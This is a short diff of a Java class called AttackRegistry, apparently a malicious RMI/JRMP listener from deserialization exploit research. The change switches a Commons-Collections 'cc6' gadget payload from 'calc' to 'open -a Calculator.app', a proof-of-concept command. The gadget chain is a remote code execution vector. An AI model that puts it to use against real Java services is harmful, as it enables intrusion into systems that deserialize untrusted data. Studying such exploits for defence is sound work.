@@ -30,8 +30,8 @@ public class AttackRegistry implements Runnable {
 
     public static final void main(String[] args) {
         try {
-//            Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
-            Object annotationInvocationHandler = Serializer.cc6("calc");
+            Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
+//            Object annotationInvocationHandler = Serializer.cc6("calc");
             int port = 1099;
 
             System.err.println("* Opening JRMP listener on " + port);
